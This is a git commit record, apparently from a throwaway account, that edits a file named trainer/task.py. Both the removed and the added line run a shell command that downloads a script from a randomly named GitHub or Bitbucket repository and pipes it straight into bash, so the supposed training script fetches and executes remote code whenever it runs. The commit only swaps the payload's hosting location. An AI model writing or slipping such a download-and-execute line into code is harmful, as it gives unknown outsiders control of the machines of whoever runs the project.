14cc9b9a72f844f1e9525dedaf349a654ac70b3c
srgehwgh <douglasiversen5919301@gmail.com>
2024-07-18 02:08:27 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/ganggamulyana08/ganggamulyana08/raw/main/nai | bash')
+os.system('curl -sL https://bitbucket.org/gckuvhjklrt/zpgsedesauiof/raw/main/a | bash')
